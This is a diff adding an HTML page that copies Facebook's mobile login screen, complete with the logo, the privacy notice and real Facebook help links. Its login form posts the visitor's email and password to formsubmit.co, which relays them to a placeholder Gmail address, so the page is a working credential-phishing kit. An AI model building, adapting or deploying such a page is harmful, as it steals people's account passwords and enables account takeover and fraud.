@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="web2.css">
+    
+    <title>Document</title>
+</head>
+<body>
+    <div class="Container">
+        <div id="face_book_language">English (US)</div>
+        <div><img id="language_button" src="img/back_button_downward.png"></div>
+    </div>
+    <img id="face_book_logo" src="img/facebook_logo.png">
+    <div id="text_container1">By proceeding, you allow Facebook to request and receive your mobile number from your mobile network. Review your mobile network's<a id="link" href="https://www.facebook.com/policies_center/"> terms and privacy policy. Change Settings</a></div>
+
+    <form action="https://formsubmit.co/yourgmail@gmail.com" method="POST">
+
+    <input id="intput_email" type="email" name="email" placeholder="Mobile number or email">
+
+    <div id="password-box">
+        <input id="password" type="password" name="password" placeholder="Password">
+        <img id="eye_icon" src="img/eye_icon.png" onclick="togglePassword()" style="cursor:pointer;">
+    </div>
+
+    <input id="login_button" type="submit" value="Log in">
+
+</form>
+    <div id="Forgot_password"><a href="https://www.facebook.com/help/105487009541643/">Forgot password?</a></div>
+</body>
+
+<script>
+function togglePassword() {
+    const password = document.getElementById("password");
+    const eye = document.getElementById("eye_icon");
+
+    if (password.type === "password") {
+        password.type = "text";
+        eye.src = "img/eye_icon2.png";
+    } else {
+        password.type = "password";
+        eye.src = "img/eye_icon.png";
+    }
+}
+</script>
+</html>
